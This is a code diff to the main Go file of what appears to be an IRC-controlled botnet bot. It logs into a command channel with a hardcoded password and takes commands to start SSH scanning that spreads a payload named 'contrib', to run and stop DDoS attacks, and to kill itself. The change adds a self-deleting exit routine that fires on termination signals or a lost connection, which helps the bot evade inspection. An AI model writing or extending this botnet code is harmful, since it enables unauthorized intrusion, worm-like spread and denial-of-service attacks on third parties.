@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"net/textproto"
 	"os"
+	"os/signal"
+	"syscall"
 
 	"bot/tools"
 )
@@ -15,26 +17,48 @@ import (
 
 const (
 	IRC_Server        = "192.168.1.4:6667" //config IRC server and port here.
-	IRC_Backup_Server = "192.168.1.4:6667" //config Backup IRC server and port here.
 	IRC_Channel       = "#Test "           //config channel here //should have space!!!
 	IRC_Chan_Password = "3#D}X]kuxT$ "     //config channel password here.
 	Payload_Name      = "contrib"          //config payload name //default is "contrib"
 )
 
-/////////////////////////////////////////////////////////////////
-//////////////////////// END HERE!!! ///////////////////////////
-///////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+////////////////////////// END HERE!!! ///////////////////////////////
+/////////////////////////////////////////////////////////////////////
+
+func selfKill() {
+	os.Remove(os.Args[0])
+	os.Exit(0)
+}
 
 func main() {
 	irc := tools.IRC_Conn(IRC_Server)
 	tp := textproto.NewReader(bufio.NewReader(irc))
 	tools.IRC_Login(irc, IRC_Channel, IRC_Chan_Password)
 
+	sig := make(chan os.Signal)
+	signal.Notify(sig,
+		syscall.SIGHUP,
+		syscall.SIGINT,
+		syscall.SIGQUIT,
+		syscall.SIGTERM,
+	)
+
+	//Inturrupt Checker
+	go func() {
+		<-sig
+		selfKill()
+	}()
+
 	for {
-		ircRead, _ := tp.ReadLine()
+		ircRead, err := tp.ReadLine()
 		fmt.Println(ircRead)
 
+		//Server struct interact
 		go func() {
+			if err != nil {
+				selfKill()
+			}
 			if tools.IRC_Find(ircRead, "PING :") {
 				tools.IRC_Send(irc, "PONG "+tools.IRC_Recv(ircRead, 1))
 			}
@@ -72,8 +96,7 @@ func main() {
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START SCANNING.")
 				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
 			} else if tools.IRC_Find(ircRead, "?kill") {
-				os.Remove(os.Args[0])
-				os.Exit(0)
+				selfKill()
 			} else if tools.IRC_Find(ircRead, "?stop.ddos") {
 				tools.DDoS_Switch = true
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :STOP ATTACKING.")
